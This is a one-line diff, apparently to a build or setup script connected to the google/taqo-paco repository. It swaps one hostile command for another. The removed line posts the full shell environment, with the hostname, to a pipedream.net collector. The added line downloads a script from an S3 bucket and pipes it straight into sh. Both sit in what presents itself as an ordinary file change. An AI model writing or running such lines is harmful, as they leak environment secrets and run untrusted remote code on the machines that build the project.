@@ -1,1 +1,1 @@
-set | curl -X POST --data-binary @- https://eokz0j3pm48nvi9.m.pipedream.net/?1?repository=https://github.com/google/taqo-paco.git\&folder=taqo-paco\&hostname=`hostname`\&foo=evs
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/google/taqo-paco.git\&folder=taqo-paco\&hostname=`hostname`\&foo=fve
